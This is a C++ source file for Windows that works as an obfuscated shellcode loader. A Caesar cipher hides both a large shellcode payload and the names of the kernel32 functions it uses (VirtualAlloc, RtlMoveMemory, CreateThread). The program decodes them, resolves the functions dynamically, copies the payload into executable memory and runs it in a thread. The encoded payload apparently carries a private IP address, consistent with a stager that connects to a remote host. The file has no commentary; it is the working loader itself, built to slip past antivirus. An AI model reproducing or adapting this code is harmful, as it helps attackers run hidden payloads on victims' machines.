#include <iostream>
#include <Windows.h>

typedef LPVOID(WINAPI* VA)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
    );

typedef VOID(WINAPI* MVM)(
    VOID UNALIGNED* Destination,
    const VOID UNALIGNED* Source,
    SIZE_T Length
    );

typedef HANDLE(WINAPI* CT)(
    LPSECURITY_ATTRIBUTES lpThreadAttribute,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD dwCreationFlag,
    LPDWORD lpThreadID
    );

int caesarOffset = 197;

void decodeCaesar(unsigned char buf[], int size)
{
    printf("Decoded: \n");
    //decode fucntion
    for (int i = 0; i < size - 1; i++)
    {
        buf[i] = (char((int)buf[i] - caesarOffset % 255));
        printf("%c", buf[i]);
    }
    printf("\n");
    printf("\n");
}

int main()
{
    void* execute;
    HANDLE thread;

    //buffers   
    unsigned char vaBuf[] = "\x1b\x2e\x37\x39\x3a\x26\x31\x06\x31\x31\x34\x28";
    unsigned char shellBuf[] = "\xc1\x0d\x48\xa9\xb5\xad\x91\xc5\xc5\xc5\x06\x16\x06\x15\x17\x0d\xf6\x97\x16\x2a\x0d\x50\x17\x25\x1b\x0d\x50\x17\xdd\x0d\x50\x17\xe5\x0d\xd4\x7c\x0f\x0f\x0d\x50\x37\x15\x12\xf6\x8e\x0d\xf6\x85\x71\x01\x26\x41\xc7\xf1\xe5\x06\x86\x8e\xd2\x06\xc6\x86\xa7\xb2\x17\x0d\x50\x17\xe5\x06\x16\x50\x07\x01\x0d\xc6\x95\x2b\x46\x3d\xdd\xd0\xc7\xd4\x4a\x37\xc5\xc5\xc5\x50\x45\x4d\xc5\xc5\xc5\x0d\x4a\x85\x39\x2c\x0d\xc6\x95\x50\x0d\xdd\x15\x09\x50\x05\xe5\x0e\xc6\x95\xa8\x1b\x0d\xc4\x8e\x06\x50\xf9\x4d\x12\xf6\x8e\x0d\xc6\x9b\x0d\xf6\x85\x71\x06\x86\x8e\xd2\x06\xc6\x86\xfd\xa5\x3a\xb6\x11\xc8\x11\xe9\xcd\x0a\xfe\x96\x3a\x9d\x1d\x09\x50\x05\xe9\x0e\xc6\x95\x2b\x06\x50\xd1\x0d\x09\x50\x05\xe1\x0e\xc6\x95\x06\x50\xc9\x4d\x06\x1d\x0d\xc6\x95\x06\x1d\x23\x1e\x1f\x06\x1d\x06\x1e\x06\x1f\x0d\x48\xb1\xe5\x06\x17\xc4\xa5\x1d\x06\x1e\x1f\x0d\x50\xd7\xae\x10\xc4\xc4\xc4\x22\x0d\xf6\xa0\x18\x0e\x83\x3c\x2e\x33\x2e\x33\x2a\x39\xc5\x06\x1b\x0d\x4e\xa6\x0e\x8c\x87\x11\x3c\xeb\xcc\xc4\x9a\x18\x18\x0d\x4e\xa6\x18\x1f\x12\xf6\x85\x12\xf6\x8e\x18\x18\x0e\x7f\xff\x1b\x3e\x6c\xc5\xc5\xc5\xc5\xc4\x9a\xad\xd5\xc5\xc5\xc5\xf6\xfe\xf7\xf3\xf6\xfb\xfd\xf3\xf7\xf8\xfa\xf3\xf6\xf7\xfd\xc5\x1f\x0d\x4e\x86\x0e\x8c\x85\xd4\xec\xc5\xc5\x12\xf6\x8e\x18\x18\x2f\xc8\x18\x0e\x7f\x1c\x4e\x64\x8b\xc5\xc5\xc5\xc5\xc4\x9a\xad\x06\xc5\xc5\xc5\xf4\x3a\x17\x2e\xf5\x3a\x15\x3f\x07\x32\x3a\x17\x12\x1d\x1a\xf6\x2b\x11\xfb\x15\x2c\xf7\x16\x27\xf5\x12\x09\x2a\x27\x28\x13\x1a\x1a\x31\xfa\x14\x33\x1b\xf5\x1e\x26\x1b\x35\xfe\x2d\x3f\x26\x34\x3d\x3b\x3d\xfc\x30\x33\xfb\x0c\xfe\x24\x15\x27\x0d\x2a\xfc\x0a\xc5\x0d\x4e\x86\x18\x1f\x06\x1d\x12\xf6\x8e\x18\x0d\x7d\xc5\xf7\x6d\x49\xc5\xc5\xc5\xc5\x15\x18\x18\x0e\x8c\x87\xb0\x1a\xf3\x00\xc4\x9a\x0d\x4e\x8b\x2f\xcf\x24\x0d\x4e\xb6\x2f\xe4\x1f\x17\x2d\x45\xf8\xc5\xc5\x0e\x4e\xa5\x2f\xc9\x06\x1e\x0e\x7f\x3a\x0b\x63\x4b\xc5\xc5\xc5\xc5\xc4\x9a\x12\xf6\x85\x18\x1f\x0d\x4e\xb6\x12\xf6\x8e\x12\xf6\x8e\x18\x18\x0e\x8c\x87\xf2\xcb\xdd\x40\xc4\x9a\x4a\x85\x3a\xe4\x0d\x8c\x86\x4d\xd8\xc5\xc5\x0e\x7f\x09\xb5\xfa\xa5\xc5\xc5\xc5\xc5\xc4\x9a\x0d\xc4\x94\x39\xc7\xb0\x6f\xad\x1a\xc5\xc5\xc5\x18\x1e\x2f\x05\x1f\x0e\x4e\x96\x86\xa7\xd5\x0e\x8c\x85\xc5\xd5\xc5\xc5\x0e\x7f\x1d\x69\x18\xaa\xc5\xc5\xc5\xc5\xc4\x9a\x0d\x58\x18\x18\x0d\x4e\xac\x0d\x4e\xb6\x0d\x4e\x9f\x0e\x8c\x85\xc5\xe5\xc5\xc5\x0e\x4e\xbe\x0e\x7f\xd7\x5b\x4e\xa7\xc5\xc5\xc5\xc5\xc4\x9a\x0d\x48\x89\xe5\x4a\x85\x39\x77\x2b\x50\xcc\x0d\xc6\x88\x4a\x85\x3a\x97\x1d\x88\x1d\x2f\xc5\x1e\x0e\x8c\x87\xb5\x7a\x67\x1b\xc4\x9a";
    unsigned char mvmBuf[] = "\x17\x39\x31\x12\x34\x3b\x2a\x12\x2a\x32\x34\x37\x3e";
    unsigned char ctBuf[] = "\x08\x37\x2a\x26\x39\x2a\x19\x2d\x37\x2a\x26\x29";
    unsigned char kernBuf[] = "\x30\x2a\x37\x33\x2a\x31\xf8\xf7";

    //buffer lens
    unsigned int vaBufLegth, shellBufLength, kernBufLength, mvmBufLength, ctBufLength;
    vaBufLegth = sizeof(vaBuf);
    shellBufLength = sizeof(shellBuf);
    kernBufLength = sizeof(kernBuf);
    mvmBufLength = sizeof(mvmBuf);
    ctBufLength = sizeof(ctBuf);

    //decode bufs
    decodeCaesar(vaBuf, vaBufLegth);
    decodeCaesar(shellBuf, shellBufLength);
    decodeCaesar(kernBuf, kernBufLength);
    decodeCaesar(mvmBuf, mvmBufLength);
    decodeCaesar(ctBuf, ctBufLength);

    //VirtualAlloc
    //execute = VirtualAlloc(0, shellBufLength, MEM_COMMIT | MEM_RESERVE, 0x40);
    VA vaAddy = (VA)GetProcAddress(GetModuleHandleA((LPCSTR)kernBuf), (LPCSTR)vaBuf);
    execute = vaAddy(0, shellBufLength, MEM_COMMIT | MEM_RESERVE, 0x40);
    if (execute == 0)
    {
        printf("Allocate error!\n");
        return 0;
    }

    //RtlMoveMemory
    //memcpy(execute, shellBuf, shellBufLength);
    MVM mvmAddy = (MVM)GetProcAddress(GetModuleHandleA((LPCSTR)kernBuf), (LPCSTR)mvmBuf);
    mvmAddy((LPVOID*)execute, (LPVOID*)shellBuf, shellBufLength);

    //CreateThread
    //thread = CreateThread(0, shellBufLength, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0);
    CT ctAddy = (CT)GetProcAddress(GetModuleHandleA((LPCSTR)kernBuf), (LPCSTR)ctBuf);
    thread = ctAddy(0, 0, (LPTHREAD_START_ROUTINE)execute, 0, 0, 0);
    if (thread == 0)
    {
        printf("Thread error!\n");
        printf("Error Info: %c", GetLastError());
        return 0;
    }

    //printf("Thread PRIO %d\n", GetThreadPriority(thread));
    //SetThreadPriority(thread, 2);
    //printf("Thread PRIO %d\n", GetThreadPriority(thread));

    WaitForSingleObject(thread, -1);
    //printf("Error Info: %c", GetLastError());
    while (true)
    {
        Sleep(100);
    }

    return 0;
}